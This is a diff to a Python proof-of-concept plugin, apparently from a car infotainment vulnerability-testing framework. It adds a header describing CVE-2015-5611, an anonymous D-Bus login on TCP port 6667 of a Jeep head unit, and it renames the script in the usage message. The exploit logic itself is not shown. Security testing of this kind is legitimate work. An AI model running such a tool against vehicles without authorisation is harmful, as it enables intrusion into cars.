@@ -1,3 +1,14 @@
+"""
+PoC Name: D-Bus Anonymous Authentication
+CVE: CVE-2015-5611
+Component: Network Stack
+Category: Network
+Severity: Critical
+CVSS: 9.0
+Description: D-Bus服务通过TCP:6667接受匿名认证
+Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
+Usage: python 15_DBus_Anon_Auth.py <target_ip>
+"""
 import socket
 import sys
 from iv_plugin_base import IVIVulnerabilityPlugin
@@ -48,7 +59,7 @@ class JeepDBusPlugin(IVIVulnerabilityPlugin):
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: python poc_jeep.py <target_ip>")
+        print("Usage: python 15_DBus_Anon_Auth.py <target_ip>")
         sys.exit(1)
     plugin = JeepDBusPlugin({"target_ip": sys.argv[1]})
     plugin.run_verify()
